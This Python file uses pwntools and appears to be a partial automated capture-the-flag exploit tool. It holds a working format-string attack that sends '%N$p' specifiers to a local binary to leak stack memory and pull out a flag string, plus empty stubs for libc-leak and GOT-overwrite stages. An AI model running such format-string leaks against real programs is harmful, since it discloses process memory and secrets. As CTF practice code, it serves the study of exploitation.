from pwn import *

logging.getLogger('pwnlib').setLevel(logging.WARNING)

class FMT:
    def __init__(self, analysis):
        self.analysis = analysis
        self.filename = analysis.binary
        self.e = ELF(self.filename)
    
    def build_exploit(self):
        payload = None
        
        self.stack_leak()

    def stack_leak(self):
        hex_vals = []
        for i in range(20):
            p = process(self.filename)
            p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
            try:
                for i in p.recvline().decode('utf-8').split(' '):
                    if '0x' in i:
                        string = p64(int(i.strip('\n'), 16))
                        hex_vals.append(string.decode('utf-8'))
            except UnicodeDecodeError as e:
                next
            p.close()
        
        vals = ''.join(hex_vals)
        start = vals.find("flag")
        end = vals.find("}")
        print(vals[start:end+1])

    def libc_leak(self):
        pass

    def got_overwrite(self):
        pass

    def supporting_functions_here(self):
        print("example support function")

